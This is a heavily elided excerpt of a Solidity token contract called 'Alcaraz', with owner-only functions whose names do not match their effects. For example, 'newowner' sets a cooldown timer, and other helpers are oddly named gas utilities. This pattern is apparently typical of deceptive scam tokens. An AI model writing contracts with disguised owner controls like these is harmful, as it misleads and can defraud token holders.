...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function Initialize(address newOwner) external onlyOwner returns (bool) {
...
contract Alcaraz is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "Alcaraz";    
    string public symbol = "ALCARAZ";
    ...
    function newowner(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
    ...
    function setnewtoken(uint256 newCoolWait) external onlyOwner {
        require(
    ...
    function doubleInput(uint256 gas) external pure returns(uint256) {
      require(gas >= 75);        
      return gas * 1 gwei;
  }

    function constructionReset(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
      require(gas >= 750000);
